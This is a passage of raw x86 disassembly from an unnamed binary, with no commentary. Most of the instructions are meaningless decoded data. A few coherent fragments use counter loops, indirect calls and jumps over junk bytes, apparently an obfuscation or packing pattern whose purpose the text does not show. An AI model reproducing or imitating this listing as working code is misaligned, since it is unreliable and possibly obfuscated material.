  4074d3:	enter  0x4b6,0xe9
  4074d7:	arpl   si,di
  4074d9:	and    dl,cl
  4074db:	push   esp
  4074dc:	or     DWORD PTR ds:0x35c58f0a,edi
  4074e2:	push   esi
  4074e3:	lods   eax,DWORD PTR ds:[esi]
  4074e4:	push   ebp
  4074e5:	int3   
  4074e6:	or     ch,dh
  4074e8:	sar    BYTE PTR [esi],1
  4074ea:	sbb    dh,BYTE PTR [ecx+eax*2-0x6f]
  4074ee:	cmc    
  4074ef:	add    bl,BYTE PTR [ecx]
  4074f1:	lahf   
  4074f2:	mov    ebp,0x41e5490b
  4074f7:	rcl    ebp,0xea
  4074fa:	aam    0x83
  4074fc:	imul   ecx,DWORD PTR [ecx+0x2e618def],0xbfd0b893
  407506:	ds mov ah,0x3e
  407509:	jl     0x4074be
  40750b:	mov    ebp,0x39282ca3
  407510:	test   DWORD PTR ds:0xd2c3bf76,eax
  407516:	cmp    eax,DWORD PTR [ebp+0x68108eb8]
  40751c:	out    dx,eax
  40751d:	sbb    ebx,ebx
  40751f:	xor    eax,DWORD PTR [edx-0x64]
  407522:	(bad)  
  407523:	pusha  
  407524:	das    
  407525:	push   ds
  407526:	jae    0x407589
  407528:	fiadd  WORD PTR [ebx+0x1cde291e]
  40752e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752f:	sbb    DWORD PTR [ebx+ecx*1],esp
  407532:	xlat   BYTE PTR ds:[ebx]
  407533:	lods   al,BYTE PTR ds:[esi]
  407534:	jb     0x4075b1
  407536:	mov    edx,0x607b360d
  40753b:	xchg   esi,eax
  40753c:	dec    esp
  40753d:	pop    edi
  40753e:	ficom  WORD PTR [edi+0x71]
  407541:	std    
  407542:	pop    esp
  407543:	mov    ds:0x40e6ef08,al
  407548:	jmp    0x953e:0x7f2142ec
  40754f:	stc    
  407550:	mov    ds:0xb505411d,al
  407555:	dec    esp
  407556:	mov    WORD PTR [ebx+0x4785250d],ss
  40755c:	sahf   
  40755d:	(bad)  
  40755e:	aaa    
  40755f:	cmp    BYTE PTR [ebx],dh
  407561:	les    esi,FWORD PTR [edx-0x40]
  407564:	inc    edi
  407565:	xchg   esp,eax
  407566:	mov    ebp,0x22720747
  40756b:	pop    ss
  40756c:	sbb    DWORD PTR [ebx-0x6b94c8fc],ebp
  407572:	push   esi
  407573:	scas   al,BYTE PTR es:[edi]
  407574:	jno    0x407557
  407576:	mov    bl,0x73
  407578:	pop    es
  407579:	mov    al,0x56
  40757b:	cmp    al,0xe8
  40757d:	dec    esp
  40757e:	je     0x40750b
  407580:	xchg   esi,eax
  407581:	or     BYTE PTR [edi+0x36f9bb22],dl
  407587:	js     0x407595
  407589:	int    0x6d
  40758b:	xchg   ecx,eax
  40758c:	fmul   QWORD PTR [ebx-0x7c7a995]
  407592:	xor    DWORD PTR [ebx+0x1278987c],edi
  407598:	cmp    eax,DWORD PTR [ecx-0x7f015f85]
  40759e:	ds ja  0x4075d8
  4075a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075a2:	les    edx,FWORD PTR [ecx]
  4075a4:	jmp    0xf75c:0x966e0
  4075ab:	retf   
  4075ac:	nop
  4075ad:	lahf   
  4075ae:	cmp    al,BYTE PTR [ebx]
  4075b0:	call   0x13a19980
  4075b5:	dec    ebp
  4075b6:	pop    edi
  4075b7:	pop    ds
  4075b8:	sbb    al,0x6f
  4075ba:	div    BYTE PTR [esi+0x7822ebf7]
  4075c0:	test   bl,cl
  4075c2:	mov    al,0x16
  4075c4:	in     eax,0xfc
  4075c6:	fcomp  QWORD PTR [edi+edi*2]
  4075c9:	push   edx
  4075ca:	lea    edx,gs:[ebx+0x6e]
  4075ce:	sbb    dl,BYTE PTR [edx]
  4075d0:	in     al,dx
  4075d1:	fnop   
  4075d3:	sbb    esi,DWORD PTR [ebp-0x69]
  4075d6:	popa   
  4075d7:	inc    ecx
  4075d8:	dec    edx
  4075d9:	int3   
  4075da:	sbb    bl,BYTE PTR [eax+0x11c403f8]
  4075e0:	push   es
  4075e1:	lea    esp,[edx+0x7f]
  4075e4:	mov    al,0xce
  4075e6:	sub    eax,0x41b661b8
  4075eb:	xor    cl,al
  4075ed:	data16 int3 
  4075ef:	call   0x805b:0x4fb9fb70
  4075f6:	sbb    al,0x40
  4075f8:	mov    bh,0x2b
  4075fa:	ja     0x40757e
  4075fc:	jmp    0x7efeb591
  407601:	arpl   WORD PTR [ebx+esi*1],bp
  407604:	mov    fs,WORD PTR [ebx+0x58968da]
  40760a:	call   DWORD PTR [edx+0x267318c0]
  407610:	in     al,0x16
  407612:	jge    0x407674
  407614:	lea    ebx,[edx+0x11]
  407617:	jns    0x4075ea
  407619:	xchg   ebx,eax
  40761a:	pop    DWORD PTR gs:[ecx]
  40761d:	je     0x40910e
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42edcb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42edcb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42edcb,edx
  407647:	cmp    DWORD PTR ds:0x42edcb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42edcb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42eab3
  40766a:	cmp    DWORD PTR ds:0x42edcb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42edcb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42edcb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	mov    ds:0x411771a4,eax
  4076a9:	ret    0x7e7e
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x4076b0
  4076b1:	aaa    
  4076b2:	adc    esi,esi
  4076b4:	sbb    DWORD PTR [eax+0x3fa5681b],esp
  4076ba:	mov    eax,ds:0x6c259788
  4076bf:	int3   
  4076c0:	(bad)  
  4076c4:	fldlg2 
  4076c6:	aad    0xc0
  4076c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c9:	cmp    cl,cl
  4076cb:	jg     0x4076f7
  4076cd:	xlat   BYTE PTR ds:[ebx]
  4076ce:	ror    BYTE PTR [ebx+0x6f0347ad],0xd9
  4076d5:	jo     0x4076d9
  4076d7:	xor    BYTE PTR [edi],dl
  4076d9:	ficomp WORD PTR [ecx+0x11e92d61]
  4076df:	or     al,0x9d
  4076e1:	lea    edi,[edi-0x2]
  4076e4:	mov    ds:0x522cd335,eax
  4076e9:	sbb    eax,0x191f9091
  4076ee:	sub    dh,BYTE PTR [ebx]
  4076f0:	and    BYTE PTR [edi-0x6b],dh
  4076f3:	push   ebp
  4076f4:	push   esi
  4076f5:	pop    edx
  4076f6:	add    BYTE PTR fs:[esi+0x49],ah
  4076fa:	push   es
  4076fb:	js     0x4076e4
  4076fd:	stos   BYTE PTR es:[edi],al
  4076fe:	into   
  4076ff:	iret   
  407700:	jae    0x407716
  407702:	hlt    
  407703:	xchg   edi,eax
  407704:	sub    al,0x1c
  407706:	leave  
  407707:	add    ebp,edx
  407709:	fdivr  DWORD PTR [ecx+ebp*2-0x2]
  40770d:	js     0x4076ec
  40770f:	inc    edi
  407710:	xchg   edx,eax
  407711:	pop    ds
  407712:	call   0x2978:0xc9772aa7
  407719:	inc    eax
  40771a:	loopne 0x4076b0
  40771c:	xchg   DWORD PTR ds:0x1747d5e4,edx
  407722:	mov    edi,0xac226f18
  407727:	test   DWORD PTR [eax-0xe0d90f0],ebx
  40772d:	xchg   DWORD PTR [eax-0x39a2c575],eax
  407733:	(bad)  
  407734:	leave  
  407735:	sub    al,0xa4
  407737:	adc    BYTE PTR [ebx-0x43],bh
  40773a:	sbb    eax,0x13893169
  40773f:	es adc eax,0x57599dbf
  407745:	dec    ecx
  407746:	sbb    al,0xcf
  407748:	mov    esi,0x4117c092
  40774d:	not    cl
  40774f:	les    edi,FWORD PTR [edi+0x16]
  407752:	fistp  WORD PTR [edx+ebx*1-0x1f]
  407756:	sub    eax,0x135da7a3
  40775b:	les    edx,FWORD PTR [ecx+0x21f973ee]
  407761:	or     al,0x72
  407763:	add    bl,BYTE PTR [eax-0x107a6748]
  407769:	je     0x4077d8
  40776b:	dec    edx
  40776c:	push   ebp
  40776d:	sub    eax,0x4770ae6c
  407772:	out    0xce,al
  407774:	stc    
  407775:	jnp    0x40771a
  407777:	iret   
  407778:	jl     0x407745
  40777a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40777b:	icebp  
  40777c:	in     al,dx
  40777d:	cmp    eax,0xa6a06d75
  407782:	inc    edi
  407783:	rol    DWORD PTR [ebx],0xa9
  407786:	jb     0x407797
  407788:	mov    al,0xa7
  40778a:	idiv   DWORD PTR [ebx]
  40778c:	addr16 dec ebx
  40778e:	cwde   
  40778f:	neg    DWORD PTR [edx+0x4909ca53]
  407795:	mov    cl,0xa0
  407797:	cmp    al,0x3a
  407799:	dec    ebp
  40779a:	mov    al,0xe1
  40779c:	cmp    edi,ebx
  40779e:	mov    edx,0xc16338fc
  4077a3:	push   0x9362cf44
  4077a8:	and    eax,0x4cc5422b
  4077ad:	or     edi,0x71
  4077b0:	shr    edx,1
  4077b2:	sbb    eax,0x55c29d4f
  4077b7:	rcr    BYTE PTR [eax],0x24
  4077ba:	repz xchg esi,eax
  4077bc:	lock lods al,BYTE PTR ds:[esi]
  4077be:	mov    esi,0x3ffa9748
  4077c3:	hlt    
  4077c4:	mov    BYTE PTR [edi+edx*2],cl
  4077c7:	lds    esp,FWORD PTR [ecx+0x9584ac6]
  4077cd:	push   es
  4077ce:	(bad)  
  4077cf:	jae    0x407754
  4077d1:	jmp    0x407824
  4077d3:	femms  
  4077d5:	cwde   
  4077d6:	(bad)  
  4077d7:	call   FWORD PTR [ecx-0x6c]
  4077da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077db:	pop    esp
  4077dc:	inc    ecx
  4077dd:	inc    edi
  4077de:	jmp    0x5761:0x5b6271cf
  4077e5:	mov    al,0x71
  4077e7:	cmp    edx,0x8e6fff54
  4077ed:	cmp    al,0x66
  4077ef:	xchg   ebx,eax
  4077f0:	test   BYTE PTR [esi-0x3a4b458],cl
  4077f6:	inc    edi
  4077f7:	jb     0x4077d8
  4077f9:	loope  0x4077b0
  4077fb:	leave  
  4077fc:	pop    ds
  4077fd:	mov    bl,BYTE PTR [esp+ecx*8+0x48004827]
  407804:	mov    bh,0x36
  407806:	ret    
  407807:	push   0xfc65817f
  40780c:	sti    
  40780d:	daa    
  40780e:	(bad)  
  40780f:	fistp  WORD PTR [esi-0x37]
  407812:	pop    ebp
  407813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407814:	sbb    bl,BYTE PTR [ebx-0x22]
  407817:	xor    dl,ah
  407819:	cmp    dl,BYTE PTR [eax-0x756b814a]
  40781f:	jo     0x4077cb
  407821:	(bad)
  407824:	xor    DWORD PTR [ebp+0x60],esp
  407827:	hlt    
  407828:	add    esp,esi
  40782a:	add    DWORD PTR [esi],ecx
  40782c:	data16 cmc 
  40782e:	xchg   esp,eax
  40782f:	and    DWORD PTR [edi-0x45],eax
  407832:	and    eax,0x4bf33a86
  407837:	cmp    ecx,DWORD PTR [edi]
  407839:	mov    esp,0x98ab0974
  40783e:	mov    al,0xd5
  407840:	sbb    ecx,DWORD PTR [eax+0x3a]
  407843:	add    al,0x8b
  407845:	push   ebp
  407846:	cld    
  407847:	adc    DWORD PTR ds:0x430449,0x4304cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43046d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e7c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e7c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e7c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42eab7
  407896:	mov    edi,DWORD PTR ds:0x42e7c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e7c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42edcf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43043d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43043d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43043d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43043d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42ec27
  4078f1:	cmp    DWORD PTR ds:0x43043d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	jmp    DWORD PTR [eax]
  407943:	jl     0x407922
  407945:	push   esi
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x407906
  40794f:	mov    edx,0x50d870e9
  407954:	add    BYTE PTR [esi+0x12],bl
  407957:	and    ebx,DWORD PTR ds:0x2dee438b
  40795d:	enter  0x84f3,0x3c
  407961:	rcl    BYTE PTR [ebp-0x7977e998],0x4a
  407968:	repz mov ds:0xdfc31f68,eax
  40796e:	stos   DWORD PTR es:[edi],eax
  40796f:	pop    esp
  407970:	pop    ds
  407971:	mov    esi,0xf16ebe0f
  407976:	adc    bh,bh
  407978:	add    esp,DWORD PTR [ecx+0x69]
  40797b:	aaa    
  40797c:	jbe    0x40790d
  40797e:	adc    al,0xd1
  407980:	xor    BYTE PTR [ebx-0x71342f4a],cl
  407986:	adc    al,0x6b
  407988:	or     ecx,DWORD PTR [esi+0x59]
  40798b:	xor    eax,0x64ca9c25
  407990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407991:	in     eax,0x91
  407993:	mov    ch,0x8c
  407995:	dec    esi
  407996:	pop    esi
  407997:	repz (bad) 
  407999:	pop    ebx
  40799a:	xchg   ebx,eax
  40799b:	shl    DWORD PTR [esi],1
  40799d:	cmp    eax,0x51946446
  4079a2:	jg     0x407924
  4079a4:	mov    WORD PTR [edx-0x21332e6],gs
  4079aa:	aad    0xa4
  4079ac:	addr16 xchg edx,eax
  4079ae:	jge    0x4079f2
  4079b0:	das    
  4079b1:	cs sbb eax,0x316a703a
  4079b7:	cmc    
  4079b8:	(bad)  
  4079b9:	stos   DWORD PTR es:[edi],eax
  4079ba:	popf   
  4079bb:	retf   
  4079bc:	inc    edi
  4079bd:	cs dec ebx
  4079bf:	adc    cl,bh
  4079c1:	jmp    FWORD PTR [ebp+0x12478582]
  4079c7:	lods   eax,DWORD PTR ds:[esi]
  4079c8:	gs (bad) 
  4079cc:	das    
  4079cd:	xchg   esi,eax
  4079ce:	cmp    BYTE PTR [esi+0x440c0f46],dh
  4079d4:	lea    esp,[eax+edx*4+0x4cf98be2]
  4079db:	xchg   edi,eax
  4079dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079dd:	enter  0xe7a6,0x86
  4079e1:	popf   
  4079e2:	sbb    dh,BYTE PTR [ebx]
  4079e4:	cmp    al,BYTE PTR [esi+0x1]
  4079e7:	jno    0x407a20
  4079e9:	pop    ds
  4079ea:	in     al,dx
  4079eb:	sti    
  4079ec:	sub    DWORD PTR [esp+ecx*8-0x80],ecx
  4079f0:	inc    esi
  4079f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f2:	mov    ds:0x546a3a9,al
  4079f7:	into   
  4079f8:	test   al,0xfe
  4079fa:	sbb    DWORD PTR [ecx-0x75],edi
  4079fd:	push   cs
  4079fe:	adc    BYTE PTR [edx+0x71],al
  407a01:	jl     0x4079ad
  407a03:	loopne 0x407a53
  407a05:	sub    BYTE PTR ss:[esp+eax*4-0xc],ah
  407a0a:	out    0x66,al
  407a0c:	aad    0xb5
  407a0e:	nop
  407a0f:	fisttp QWORD PTR ds:0xa49a9db9
  407a15:	sub    DWORD PTR [ebx+0x1c],ebp
  407a18:	mov    ch,0xb3
  407a1a:	sbb    eax,DWORD PTR [eax+0x7a71667a]
  407a20:	pop    esp
  407a21:	push   esp
  407a22:	mov    ebx,0xc4fc341c
  407a27:	aaa    
  407a28:	mov    al,0x3
  407a2a:	adc    DWORD PTR [eax+0x35a088d1],0xe7de6a0f
  407a34:	lods   eax,DWORD PTR ds:[esi]
  407a35:	xor    DWORD PTR [esi-0x1d],ecx
  407a38:	cmp    eax,0xc06d531c
  407a3d:	mov    WORD PTR [ebx],?
  407a3f:	pop    esp
  407a40:	mov    ebx,DWORD PTR [edi+eiz*1+0x585865c6]
  407a47:	pop    ebx
  407a48:	mov    bh,0xa9
  407a4a:	pop    ss
  407a4b:	push   es
  407a4c:	or     BYTE PTR [ebx],bl
  407a4e:	sub    cl,BYTE PTR es:[edx-0x4a6e40cd]
  407a55:	jo     0x407a2e
  407a57:	xor    BYTE PTR [esi-0x30],al
  407a5a:	aas    
  407a5b:	popa   
  407a5c:	xchg   ebp,eax
  407a5d:	sub    bh,BYTE PTR [edi+0x4ed52a50]
  407a63:	adc    al,0xd8
  407a66:	fprem1 
  407a68:	data16 xor al,0x8
  407a6b:	jae    0x407a47
  407a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6e:	lods   al,BYTE PTR ds:[esi]
  407a6f:	(bad)  
  407a70:	out    0x1a,al
  407a72:	inc    edi
  407a73:	iret   
  407a74:	xor    edi,edi
  407a76:	lea    ecx,[edi+0xc154b9c]
  407a7c:	imul   esp,DWORD PTR ds:0x440d3fd2,0x520196cc
  407a86:	mov    ?,WORD PTR [esi]
  407a88:	mov    ds:0x19251e07,al
  407a8d:	fdiv   st,st(1)
  407a90:	pop    ebp
  407a91:	jo     0x407aff
  407a93:	outs   dx,BYTE PTR ds:[esi]
  407a94:	pop    es
  407a95:	(bad)  
  407a96:	adc    ecx,DWORD PTR [edi-0x4c35634d]
  407a9c:	xor    eax,0x362647b2
  407aa1:	aad    0x8c
  407aa3:	inc    eax
  407aa4:	jge    0x407ada
  407aa6:	dec    eax
  407aa7:	shl    BYTE PTR [eax+0x66],cl
  407aaa:	mov    edi,0xf9fb6090
  407aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ab0:	sbb    bl,BYTE PTR [ecx+0xed44eb]
  407ab6:	push   0xbcdfc397
  407abb:	pop    es
  407abc:	hlt    
  407abd:	mov    edi,ebx
  407abf:	pop    es
  407ac0:	std    
  407ac1:	jbe    0x407b14
  407ac3:	cmp    al,0x47
  407ac5:	jo     0x407a79
  407ac7:	jo     0x407b38
  407ac9:	std    
  407aca:	ds or  eax,0x82c0a690
  407ad0:	sub    ebx,DWORD PTR [ecx-0x5ff645ae]
  407ad6:	or     DWORD PTR [esi-0x42d3ef52],ebp
  407adc:	sbb    ah,BYTE PTR [esp+edx*4]
  407adf:	xchg   bl,cl
  407ae1:	inc    ecx
  407ae2:	mov    ebx,DWORD PTR [ebp-0x10]
  407ae5:	sub    ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x13100336]
  407b11:	ins    DWORD PTR es:[edi],dx
  407b12:	imul   eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	mov    al,0x2b
  407b1d:	fsubr  DWORD PTR [edx]
  407b1f:	iret   
  407b20:	stc    
  407b21:	pop    esi
  407b22:	add    eax,0x35309cc6
  407b27:	lods   eax,DWORD PTR ds:[esi]
  407b28:	mov    al,0x55
  407b2a:	mov    bl,0xa0
  407b2c:	adc    BYTE PTR [ebp+0x71fd214f],0x77
  407b33:	dec    esi
  407b34:	sti    
  407b35:	mov    dh,0x60
  407b37:	imul   eax,DWORD PTR [eax+0x53],0x7857643a
  407b3e:	cmp    DWORD PTR [ebx+0x24fc84a9],esi
  407b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b45:	mov    DWORD PTR [ecx-0x520a0185],0x53967f97
  407b4f:	push   0x966090ea
  407b54:	inc    ecx
  407b55:	push   ss
  407b56:	xor    BYTE PTR [ebx+0x17],0x71
  407b5a:	lods   eax,DWORD PTR ds:[esi]
  407b5b:	outs   dx,BYTE PTR ds:[esi]
  407b5c:	pushf  
  407b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b5e:	pop    ebp
  407b5f:	(bad)  
  407b60:	dec    esp
  407b61:	fwait
  407b62:	or     ah,BYTE PTR [edi]
  407b64:	pop    ecx
  407b65:	shl    BYTE PTR [eax+0x49e5ab7e],0x89
  407b6c:	test   eax,0xa72e29da
  407b71:	rol    dl,cl
  407b73:	ror    DWORD PTR [ecx+edx*8+0x2d],0x85
  407b78:	mov    esp,0x47625119
  407b7d:	call   0x95717755
  407b82:	test   eax,0xc84b338d
  407b87:	clc    
  407b88:	sub    dl,BYTE PTR ds:0xaf7bcf89
  407b8e:	cmp    ch,BYTE PTR [ecx]
  407b90:	inc    eax
  407b91:	js     0x407bba
  407b93:	cmp    esi,eax
  407b95:	(bad)  
  407b97:	push   ebx
  407b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b99:	xchg   ebx,eax
  407b9a:	mov    al,ds:0x6cdf321d
  407b9f:	ret    0xf07b
  407ba2:	not    BYTE PTR [ecx]
  407ba4:	lods   eax,DWORD PTR ds:[esi]
  407ba5:	dec    ebx
  407ba6:	(bad)  
  407ba8:	inc    ecx
  407ba9:	jge    0x407b4c
  407bab:	pop    es
  407bac:	sub    eax,DWORD PTR [edx]
  407bae:	shr    BYTE PTR ds:0x3261e398,0x64
  407bb5:	mov    ecx,0x156690b2
  407bba:	xor    edx,edx
  407bbc:	inc    esi
  407bbd:	outs   dx,DWORD PTR ds:[esi]
  407bbe:	stc    
  407bbf:	test   eax,0x3ab758d4
  407bc4:	cwde   
  407bc5:	and    BYTE PTR [eax],dh
  407bc7:	pop    edx
  407bc8:	xor    edx,0xffffff8b
  407bcb:	dec    edx
  407bcc:	and    BYTE PTR [edi],ch
  407bce:	xor    DWORD PTR [ebx+0x57],eax
  407bd1:	adc    dl,BYTE PTR [esi]
  407bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd4:	aam    0x80
  407bd6:	aas    
  407bd7:	jmp    0x24ad:0xa0c696d1
  407bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bdf:	adc    eax,0x5dfe60e9
  407be4:	or     edi,DWORD PTR [edi]
  407be6:	fucomp st(0)
  407be8:	xlat   BYTE PTR ds:[ebx]
  407be9:	pop    esi
  407bea:	mov    esp,0x72bfb097
  407bef:	mov    WORD PTR [edi+0xb2a499],ds
  407bf5:	inc    DWORD PTR [edx+edi*1]
  407bf8:	in     eax,dx
  407bf9:	pop    edx
  407bfa:	jle    0x407bc7
  407bfc:	dec    esi
  407bfd:	pop    eax
  407bfe:	mov    ds:0xf107f055,eax
  407c03:	inc    esp
  407c04:	jno    0x407bfa
  407c06:	push   ecx
  407c07:	cs (bad) 
  407c09:	(bad)
  407c0c:	in     al,0xa9
  407c0e:	mov    eax,ds:0xb1615d65
  407c13:	das    
  407c14:	jne    0x407c50
  407c16:	ins    DWORD PTR es:[edi],dx
  407c17:	jnp    0x407bd5
  407c19:	push   ds
  407c1a:	(bad)  
  407c1b:	cs pushf 
  407c1d:	test   BYTE PTR [edx-0xdb8a035],dh
  407c23:	(bad)  
  407c24:	cmp    edx,DWORD PTR [esi+edx*1]
  407c27:	xchg   ebx,eax
  407c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c29:	jmp    0xb9bffd26
  407c2e:	(bad)
  407c32:	pusha  
  407c33:	clc    
  407c34:	xchg   edi,ebx
  407c36:	push   ds
  407c37:	(bad)  
  407c38:	sub    al,0xea
  407c3a:	repnz retf 0xcab5
  407c3e:	inc    edx
  407c3f:	popa   
  407c40:	push   ds
  407c41:	jecxz  0x407c51
  407c43:	push   edx
  407c44:	arpl   WORD PTR [esp+edi*1],ax
  407c47:	xor    cl,ch
  407c49:	xchg   edi,eax
  407c4a:	sti    
  407c4b:	ds (bad) 
  407c4d:	ja     0x407c1c
  407c4f:	fstp   TBYTE PTR [eax-0x8]
  407c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c53:	adc    BYTE PTR ds:0x1ebab62f,0xc2
  407c5a:	rol    DWORD PTR [edx+0x4137154d],1
  407c60:	adc    cl,ch
  407c62:	jecxz  0x407c3b
  407c64:	arpl   WORD PTR [ebp-0x72],si
  407c67:	push   eax
  407c68:	pop    edi
  407c69:	ret    0x1afe
  407c6c:	fsubr  DWORD PTR [ebx]
  407c6e:	or     al,0xbc
  407c70:	in     al,0x47
  407c72:	pop    esi
  407c73:	sub    ah,ah
  407c75:	xchg   DWORD PTR cs:[edi+0x3237f027],esi
  407c7c:	mov    fs,WORD PTR [ebp-0x17b905d5]
  407c82:	xor    eax,DWORD PTR [edi+0x4ab28ffb]
  407c88:	ins    DWORD PTR es:[edi],dx
  407c89:	xchg   BYTE PTR [esi],al
  407c8b:	les    esi,FWORD PTR [eax-0x639c0d7b]
  407c91:	test   eax,0xec767552
  407c96:	mov    ds:0x8f919304,al
  407c9c:	out    0x3,al
  407c9e:	mov    ds:0x4a7e48d9,eax
  407ca3:	mov    ds:0xe1136514,eax
  407ca8:	push   ss
  407ca9:	aad    0x49
  407cab:	cmp    cl,BYTE PTR [eax+0x33d0332b]
  407cb1:	clc    
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x434bb03a]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407cd9
  407ce1:	test   al,0xa4
  407ce3:	fucomi st,st(6)
  407ce5:	lods   al,BYTE PTR ds:[esi]
  407ce6:	sar    BYTE PTR [ebx+0x41],0x4e
  407cea:	js     0x407c98
  407cec:	mov    ds:0x95f6c2c3,al
  407cf1:	or     BYTE PTR [edi-0x784c7d13],ch
  407cf7:	inc    ebp
  407cf8:	sbb    eax,0x821874bb
  407cfd:	cmp    eax,0xe02d7741
  407d02:	shr    BYTE PTR [ebx],0x50
  407d05:	xor    al,0x83
  407d07:	jg     0x407d16
  407d09:	ds out dx,al
  407d0b:	mov    edx,DWORD PTR [ecx-0x41]
  407d0e:	pop    ecx
  407d0f:	jmp    0xb691:0x337fd372
  407d16:	xor    eax,0x9f6b7dd
  407d1b:	fist   DWORD PTR [edi-0x6e]
  407d1e:	xlat   BYTE PTR ds:[ebx]
  407d1f:	mov    al,BYTE PTR [edx-0x61]
  407d22:	jns    0x407cf1
  407d24:	xchg   BYTE PTR [edi+0x2dcc6f83],bl
  407d2a:	test   al,0x4b
  407d2c:	mov    al,ds:0x20bf4023
  407d31:	mov    cl,0x8d
  407d33:	and    DWORD PTR [esi],edi
  407d35:	sub    eax,0x8f2df976
  407d3a:	xchg   edi,eax
  407d3b:	add    BYTE PTR [edx-0x27f351dd],cl
  407d41:	imul   edx,DWORD PTR [edi],0x44
  407d44:	iret   
